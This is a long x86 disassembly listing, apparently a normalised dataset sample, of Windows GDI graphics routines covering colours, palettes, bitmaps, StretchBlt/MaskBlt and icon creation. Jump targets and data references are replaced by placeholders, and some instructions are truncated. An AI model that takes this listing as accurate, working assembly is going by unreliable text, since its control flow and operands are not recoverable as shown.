mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_421054
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_422684
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_421a28
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_4226b4
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_421d14
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_421d14
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_421df4
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_421cd8
call sub_421054
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_421cd8
call sub_421054
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_4227e4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_42282e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406660
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422835
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_422838
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_4228d4
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_4227e4
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404694
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bfa0
call sub_403e8c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4228db
lea eax [ ebp - 0x104 ]
call sub_40442c
retn
sub_4228f0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_422a3e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_4229ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_422838
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_422838
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422a45
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_422a50
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_422a84
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_4228e0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_422d04
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_4228e0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422d0b
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_4228e0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_422b57
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_407488
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422d0b
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_422d18
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_422d50
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402fc4
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_422dc8
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_422e20
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028fc
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422f1d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422f24
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_422f38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_422fbe
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_422fd0
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028fc
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_422dc8
mov eax esp
call sub_422f38
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_423074
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_422dc8
mov [ esp ] eax
sub_4230c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_422a70
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_422a50
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_423274
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_4228e0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42319a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_4228f0
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4231a1
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_4227e4
sub_4231a1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_422a70
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_4228e0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_423254
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_4228f0
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42325b
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_423290
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_423320
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_40859c
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_423617
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x8 ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_423409
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_4227e4
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423410
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_423410
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_423284
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_40859c
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_4235f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_4230c8
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_40859c
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_4235d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4235db
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_402764
retn
call sub_422838
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_423284
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_423290
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_423640
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_4227c0
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402fc4
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_422a70
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_423724
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_423640
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_423790
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_423640
xor eax eax
